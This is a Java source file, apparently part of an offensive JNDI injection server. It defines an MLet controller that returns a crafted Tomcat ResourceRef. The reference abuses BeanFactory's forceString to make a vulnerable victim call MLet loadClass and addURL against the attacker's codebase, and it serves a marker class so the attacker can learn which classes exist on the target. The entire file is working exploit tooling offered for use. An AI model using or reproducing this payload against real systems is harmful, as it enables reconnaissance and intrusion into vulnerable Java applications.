package cn.butler.jndi.controller;

import cn.butler.jndi.JndiConfig;
import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.jndi.server.WebServer;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/MLet")
public class MLetController implements Controller {
    public Object process(String className) {
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", className));
        ref.add(new StringRefAddr("b", JndiConfig.codebase));
        ref.add(new StringRefAddr("c", className + "_exists"));

        WebServer.getInstance().serveFile("/" + className.replace(".", "/") + "_exists.class", null);
        return ref;
    }

    @JNDIMapping("/{className}")
    public String detectClass(String className) {
        System.out.println("[MLet] Detect ClassName: " + className);
        return className;
    }
}
